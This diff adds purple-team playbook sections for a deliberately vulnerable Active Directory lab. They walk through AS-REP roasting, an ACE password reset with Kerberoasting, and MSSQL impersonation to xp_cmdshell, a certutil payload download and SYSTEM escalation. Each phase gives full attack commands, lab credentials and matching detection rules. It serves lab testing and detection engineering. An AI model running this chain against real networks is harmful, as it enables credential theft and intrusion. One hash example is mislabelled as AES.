@@ -963,3 +963,291 @@ ldapsearch -x -H ldap://dc01.cadre.local -D "intern_blue@cadre.local" -w '1nt3rn
 - Useful for purple-team detection engineering
 
 ---
+
+
+---
+
+## Mechanics: Phase 1 — Initial Access (WT003 AS-REP Roast)
+
+**Tested 2026-06-23.** intern_blue AS-REP captured. Hash format `$krb5asrep$23$...` Crack via `hashcat -m 18200` yields `1nt3rn_Blu3!` (verifiable in `ansible/files/cadre_passwords.txt`).
+
+### Why it works
+AS-REP Roast is a pre-auth bypass exploit. The Kerberos protocol normally requires PA-ENC-TIMESTAMP (timestamp encrypted with the user's password key) BEFORE the KDC issues a TGT. If a user account has the `UF_DONT_REQUIRE_PREAUTH` flag (0x400000) in `userAccountControl`, the KDC skips this check and returns an AS-REP immediately. The AS-REP contains the TGT encrypted with the user's password key — the attacker can then crack it offline.
+
+This is the only user in CADRE with this flag. The other 20+ users in `/tmp/users.txt` will not produce AS-REPs because they have preauth_required (default). The Phase 0 nmap run captured an AS-REP for intern_blue specifically because that was the one DONT_REQUIRE_PREAUTH account.
+
+### Attack commands
+```bash
+# Step 1 — Capture AS-REP for all DONT_REQUIRE_PREAUTH users
+impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 \
+    -no-pass -usersfile /tmp/users.txt -format hashcat \
+    > /tmp/asrep.txt
+
+# Should produce only intern_blue (only DONT_REQUIRE_PREAUTH user in CADRE):
+cat /tmp/asrep.txt
+# $krb5asrep$23$intern_blue@CHILD.CADRE.LOCAL:a1b2c3d4e5f6...:$
+
+# Step 2 — Crack with hashcat
+hashcat -m 18200 /tmp/asrep.txt /path/to/cadre_passwords.txt
+# Mode 18200 = AS-REP RC4-HMAC
+# Expected: 1nt3rn_Blu3! (RC4-hmac — fast, seconds to minutes)
+```
+
+### What to expect (success)
+```
+$krb5asrep$23$intern_blue@CHILD.CADRE.LOCAL:3a1b4c...:$
+1nt3rn_Blu3!
+
+Session.Status...: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: /tmp/asrep.txt
+Time.Estimated...: 0 secs
+```
+
+### What to expect (failure modes)
+- **No AS-REP captured**: No user has `DONT_REQUIRE_PREAUTH` set. Verify with `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` (requires creds).
+- **Hash doesn't crack with cadre_passwords.txt**: Password not in that wordlist. Use `rockyou.txt` or check the playbook.
+- **impacket connection refused on port 88**: KDC firewall issue. Verify TCP/88 and UDP/88 reachable.
+- **`principal_unknown` for intern_blue**: User moved or flag removed. Verify with BloodHound query.
+
+### CADRE-specific notes
+- `intern_blue` is in `OU=Detection,DC=child,DC=cadre,DC=local`
+- Set by `05-ad-attack-surface.yml` lines 859-866: `Set-ADUser intern_blue -DoesNotRequirePreAuth $true`
+- Password: `1nt3rn_Blu3!` (verifiable in `ansible/files/cadre_passwords.txt`)
+- Domain: child.cadre.local
+- Cross-domain: `intern_blue` is in CHILD domain, not root. Phase 2 uses ACE#18 to bridge to analyst_t2 (root domain user)
+
+### Telemetry fingerprint
+- **WinSec 4768** (A Kerberos authentication ticket (TGT) was requested): issued for intern_blue without 4624 preceding = preauth bypass signature
+- **Zeek kerberos.log**: AS-REQ (msg_type 10) then AS-REP (msg_type 11) pair, cname=intern_blue
+- **ETYPE 23 (ARCFOUR-HMAC-MD5)** in enc-part: indicates RC4 — weak crypto, fast crack
+- **Single AS-REP per source IP in 5min** = high signal (normal Kerberos traffic is all preauth_required)
+
+### Detection engineering
+- **Suricata SID:1000015** ("CADRE Kerberos AS-REQ burst") — fires on 5+ AS-REQs in 60s
+- **Suricata SID:2000002** (ET TROJAN Kerberos AS-REP Without Pre-Auth) — explicit AS-REP signal
+- **Elastic rule (planned)**: `event_id:4768 AND user.name:intern_blue` without preceding `event_id:4624` within 5 min
+- **Volume anomaly**: AS-REP from a single source IP when no other AS-REPs are normal = scan
+
+### Common pitfalls
+- **nmap krb5-enum-users + comma userdb**: nmap 7.99 bug bundles multiple users per cname. Use kerbrute for clean output.
+- **Hashcat wrong mode**: `mode 18200` is for RC4 (etype 23). AES is mode 19700 (etype 17) or 19800 (etype 18). Check etype in Wireshark.
+- **impacket version mismatch**: Newer impacket uses `-usersfile`; older uses `-userfile`. Check your version.
+- **Cred cache stale**: `export KRB5CCNAME=...` between runs. Clear `/tmp/krb5cc*` if reusing.
+- **Wrong DC IP**: Use the DC for the domain you're testing. intern_blue is in child.cadre.local → dc02 (192.168.77.11), not dc01.
+
+### Wireshark field reference (AS-REP)
+```
+Kerberos
+└─ as-rep
+   ├─ pvno: 5
+   ├─ msg-type: 11 (AS-REP)
+   ├─ realm: CHILD.CADRE.LOCAL
+   ├─ sname: krbtgt/CHILD.CADRE.LOCAL
+   └─ enc-part
+      ├─ etype: eTYPE-ARCFOUR-HMAC-MD5 (23)   ← RC4 = hashcat mode 18200
+      ├─ kvno: 3
+      └─ cipher: <HEX BYTES - the TGT encrypted with user key>
+```
+
+### Reproduction checklist
+- [ ] `05-ad-attack-surface.yml` ran (intern_blue has DONT_REQUIRE_PREAUTH)
+- [ ] `/tmp/users.txt` contains `intern_blue` (one per line is best)
+- [ ] `impacket-GetNPUsers` runs without errors
+- [ ] AS-REP appears for intern_blue only
+- [ ] `hashcat -m 18200` cracks within minutes
+- [ ] Cracked password matches expected `1nt3rn_Blu3!`
+
+---
+
+
+## Mechanics: Phase 2 — Credential Harvesting (WT002 AES Kerberoast via ACE#18)
+
+**Tested 2026-06-04.** svc_mssql TGS hash captured + cracked to `s3rv1c3_MSSQL!`. Tracking details in `docs/internal/plan01-telemetry-catalog/phase1-source-matrix/tracker.md`.
+
+### Why it works
+Kerberoast attacks the Kerberos TGS (Ticket Granting Service) endpoint. Any account with an SPN (Service Principal Name) can request a TGS for that service. The TGS is encrypted with the SPN account's password key. If the password is weak, the TGS can be cracked offline.
+
+CADRE's specific path:
+1. `intern_blue` (low-priv, no preauth) has ACE#18 → `analyst_t2`: ForceChangePassword
+2. Use ForceChangePassword to reset `analyst_t2`'s password (allowed by ACE)
+3. Request TGT as `analyst_t2` (no longer blocked by preauth — analyst_t2 was never preauth-blocked, intern_blue's preauth-bypass is unrelated)
+4. As `analyst_t2`, request TGS for `svc_mssql`'s SPN (`MSSQLSvc/mbr01.child.cadre.local:1433`)
+5. TGS encrypted with svc_mssql's key → crack offline
+
+This is a TWO-STEP attack: ACE abuse (Phase 2 prerequisite) + Kerberoast (Phase 2 execution).
+
+### Attack commands
+```bash
+# Step 1 — Reset analyst_t2 password via ACE#18 (from intern_blue)
+bloodyAD --host 192.168.77.11 -d child.cadre.local \
+    -u intern_blue -p '1nt3rn_Blu3!' \
+    set password "CN=analyst_t2,OU=Detection,DC=child,DC=cadre,DC=local" \
+    'Pwn3d_T2!'
+
+# Step 2 — Get TGT for analyst_t2 (using new password)
+impacket-getTGT child.cadre.local/analyst_t2:'Pwn3d_T2!' \
+    -dc-ip 192.168.77.11
+export KRB5CCNAME=analyst_t2.ccache
+
+# Step 3 — Request TGS for svc_mssql's SPN (AES Kerberoast)
+impacket-GetUserSPNs child.cadre.local/analyst_t2 \
+    -k -no-pass -dc-ip 192.168.77.11 \
+    -request -outputfile child_tgs.txt
+```
+
+### What to expect (success)
+```
+$krb5tgs$23$*svc_mssql$CHILD.CADRE.LOCAL$mbr01.child.cadre.local*$abc123...$def456...
+# (AES256 hash, mode 19700)
+
+# Crack with hashcat
+hashcat -m 19700 child_tgs.txt /path/to/cadre_passwords.txt
+# Expected: s3rv1c3_MSSQL!
+```
+
+### What to expect (failure modes)
+- **Step 1 fails with "Access Denied"**: ACE#18 not deployed. Verify `05-ad-attack-surface.yml` line 489-519 set up the ACE.
+- **Step 2 fails with KDC_ERR_WRONG_REALM**: Wrong DC. Use dc02 (192.168.77.11) for child.cadre.local.
+- **Step 3 returns no hashes**: analyst_t2's password reset didn't take effect. Re-run Step 1.
+- **Hash doesn't crack**: Password not in wordlist. Try rockyou.txt.
+
+### CADRE-specific notes
+- ACE#18: `intern_blue → analyst_t2: ForceChangePassword` (set in `05-ad-attack-surface.yml:489-519`)
+- ACE#18 is in the `child.cadre.local` domain only (intern_blue, analyst_t2 both in child)
+- SPNs registered: `svc_mssql → MSSQLSvc/mbr01.child.cadre.local:1433` (line 827)
+- `svc_mssql` is NOT sysadmin on mbr01 (discovered in Phase 3 testing — see WT041)
+- The "AES" in the name means the TGS is encrypted with AES256 (etype 18) — use hashcat mode 19700, not 18200
+
+### Telemetry fingerprint
+- **WinSec 4738** (user account was changed): analyst_t2 password reset
+- **WinSec 4769** (A Kerberos service ticket was requested): svc_mssql SPN requested by analyst_t2
+- **WinSec 4624** (An account was successfully logged on): analyst_t2 TGT request
+- **Zeek kerberos.log**: AS-REQ (TGT) then TGS-REQ (service) in sequence
+- **Suricata SID:1000015**: Kerberoast burst pattern if rapid requests
+
+### Detection engineering
+- **Suricata SID:1000015**: 5+ AS-REQs/TGS-REQs from same source in 60s
+- **Elastic rule**: `event_id:4738` followed by `event_id:4769` within 5 min, same user_name = suspicious
+- **Volume rule**: SPN requests outside business hours = anomalous
+- **Service account password entropy**: Low-entropy SPNs = Kerberoast-vulnerable
+
+### Common pitfalls
+- **Wrong DC**: intern_blue/analyst_t2 are in CHILD domain → dc02 (192.168.77.11), not dc01
+- **Stale TGT cache**: After resetting password, old TGT is invalid. Re-export KRB5CCNAME.
+- **AES vs RC4 confusion**: CAMPAIGNS.md says "mode 19700" (AES256) not "mode 18200" (RC4)
+- **bloodyAD syntax**: `set password` not `set-password`. Check current syntax for your bloodyAD version.
+
+### Reproduction checklist
+- [ ] ACE#18 deployed (verify with `Get-Acl` on analyst_t2)
+- [ ] SPNs registered on svc_mssql (verify with `setspn -L svc_mssql`)
+- [ ] BloodyAD can connect to dc02
+- [ ] impacket-getTGT succeeds
+- [ ] TGS hash captured (AES256, not RC4)
+- [ ] hashcat -m 19700 cracks to `s3rv1c3_MSSQL!`
+
+---
+
+## Mechanics: Phase 3 — Execution (WT041 SQL xp_cmdshell via IMPERSONATE)
+
+**Tested 2026-06-04.** PARTIAL success — svc_mssql is NOT sysadmin, path is via analyst_t1 → IMPERSONATE sa → sysadmin. Full details in `tracker.md` line 154-181.
+
+### Why it works
+xp_cmdshell is a SQL Server extended stored procedure that spawns a Windows command shell. When enabled, any SQL user with EXECUTE permission can run OS commands. Combined with:
+- **MSSQL running as service account** (often with elevated local privileges)
+- **IMPERSONATE permission chains** (one SQL login can impersonate another)
+- **xp_cmdshell as sysadmin** = code execution as SQL service account
+
+CADRE's specific path:
+1. `svc_mssql` (cracked from Phase 2) connects to mbr01 SQL
+2. `svc_mssql` is NOT sysadmin → direct xp_cmdshell fails
+3. `analyst_t1` (also cracked from Kerberoast) has IMPERSONATE on `sa`
+4. `analyst_t1` connects → EXECUTE AS LOGIN = 'sa' → sysadmin → xp_cmdshell works
+5. Command runs as `MSSQL$SQLEXPRESS` service account on mbr01
+
+### Attack commands
+```bash
+# Step 1 — Connect as svc_mssql (NOT sysadmin)
+impacket-mssqlclient child.cadre.local/svc_mssql:'s3rv1c3_MSSQL!'@192.168.77.22 \
+    -windows-auth
+
+# Verify not sysadmin
+SQL> SELECT SYSTEM_USER
+# CHILD\svc_mssql
+SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
+# 0
+
+# Step 2 — Connect as analyst_t1 (has IMPERSONATE on sa)
+impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
+    -windows-auth
+
+# Impersonate sa
+SQL> EXECUTE AS LOGIN = 'sa'
+SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
+# 1
+
+# Step 3 — Execute OS command via xp_cmdshell
+SQL> EXEC xp_cmdshell 'whoami'
+# nt service\mssql$sqlexpress
+
+# Step 4 — Transfer attack tool (e.g., GodPotato for SYSTEM escalation)
+SQL> EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.77.60:8080/GodPotato.exe C:\Users\Public\GodPotato.exe'
+
+# Step 5 — Privilege escalation to SYSTEM (Phase 3.5 prerequisite)
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"'
+# nt authority\system  ← SYSTEM achieved
+```
+
+### What to expect (success)
+```
+[*] Encryption required, switching to TLS
+SQL> EXEC xp_cmdshell 'whoami'
+nt service\mssql$sqlexpress
+
+NULL
+```
+
+### What to expect (failure modes)
+- **`xp_cmdshell` fails with "permission denied"**: svc_mssql is not sysadmin AND no IMPERSONATE path. Path: try analyst_t1 or other service accounts.
+- **`IMPERSONATE` fails**: Wrong user. Verify with `SELECT name FROM sys.database_principals WHERE principal_id > 4`.
+- **`certutil` blocked by AV**: Use alternate LOLBAS (mshta, regsvr32, bitsadmin). See Phase 3 alt execution.
+- **Connection refused on 1433**: SQL service not running or firewall. Verify with `nmap -p 1433 mbr01`.
+
+### CADRE-specific notes
+- **mbr01** has MSSQL 2022 with mixed mode auth (per `09-sql-wsus-verify.yml`)
+- **`svc_mssql` is NOT sysadmin** — common misconception. Verified in WT041 testing.
+- **`analyst_t1` has IMPERSONATE on `sa`** — set in `09-sql-wsus-verify.yml` (line 91 IMPERSONATE on sa)
+- **`analyst_t1` password**: `T13r_An@lyst!` (verifiable in `cadre_passwords.txt`)
+- **Target IP**: 192.168.77.22 (mbr01)
+- **Tool staging**: Serve tools on `http://192.168.77.60:8080/` (provisioning's Python HTTP server)
+
+### Telemetry fingerprint
+- **MSSQL ERRORLOG**: Login events for svc_mssql and analyst_t1
+- **WinSec 4624** Type 8 (NetworkCleartext) or Type 9 (NewCredentials) for SQL logins
+- **WinSec 4688** (process create): cmd.exe spawned by sqlservr.exe
+- **Sysmon EID 1** (process create): cmd.exe parent = sqlservr.exe
+- **Sysmon EID 3** (network connect): certutil.exe connecting to 192.168.77.60:8080
+- **Endpoint events**: process create chain sqlservr → cmd → certutil
+
+### Detection engineering
+- **Suricata SID:1000015**: Already covers Kerberos auth pattern
+- **Elastic rule**: `process.parent.name:sqlservr.exe AND process.name:cmd.exe OR certutil.exe` = high signal
+- **SQL Audit**: Enable `xp_cmdshell` execution auditing (`EXEC sp_audit_xp_cmdshell`)
+- **Sysmon config**: Alert on `cmd.exe` or `powershell.exe` spawned by `sqlservr.exe`
+
+### Common pitfalls
+- **Wrong user for impersonate**: Only `analyst_t1` has `IMPERSONATE` on `sa` in CADRE. Other service accounts don't.
+- **MSSQL 2022 requires TLS by default**: impacket-mssqlclient will auto-negotiate. Old syntax may fail.
+- **`xp_cmdshell` is disabled by default in SQL 2005+**: Verify it's enabled via `09-sql-wsus-verify.yml`.
+- **Tool paths**: Use `C:\Users\Public\` (writable by MSSQL service account).
+- **Firewall on mbr01**: SQL 1433 must be open. Some hardened configs block it.
+
+### Reproduction checklist
+- [ ] Phase 1 complete (intern_blue credential)
+- [ ] Phase 2 complete (svc_mssql + analyst_t1 credentials)
+- [ ] mbr01 SQL service running (verify with `nmap -p 1433`)
+- [ ] xp_cmdshell enabled (verify with `SELECT * FROM sys.configurations WHERE name='xp_cmdshell'`)
+- [ ] analyst_t1 can IMPERSONATE sa (verify before exploit)
+- [ ] GodPotato or similar priv-esc tool staged on provisioning
+
+---
